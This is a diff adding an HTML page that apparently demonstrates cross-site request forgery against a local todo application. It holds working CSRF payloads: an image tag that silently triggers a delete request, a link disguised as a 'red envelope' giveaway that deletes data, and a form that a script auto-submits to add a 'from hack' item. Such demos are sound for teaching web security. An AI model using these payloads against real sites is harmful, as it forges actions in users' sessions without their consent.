@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>CSRF</title>
+</head>
+<body>
+<img src="http://p5shjfo1t.bkt.clouddn.com/hack.jpg">
+<!--用户不点击也中招-->
+<img src="http://0.0.0.0:4000/todo/delete/3">
+<!--通过cookie，再伪造request删除/add用户数据-->
+
+<a href="http://0.0.0.0:4000/todo/delete/4">
+    点击领取红包
+</a>
+
+<form action="http://0.0.0.0:4000/todo/add" method="post">
+    <input type="text" value="from hack" name="title" placeholder="请输入todo">
+    <br>
+    <button id="add" type="submit">添加</button>
+</form>
+
+<script>
+    <!--自动提交-->
+    let e = function(sel) {
+        return document.querySelector(sel)
+    }
+
+    e('#add').click()
+</script>
+
+</body>
+</html>
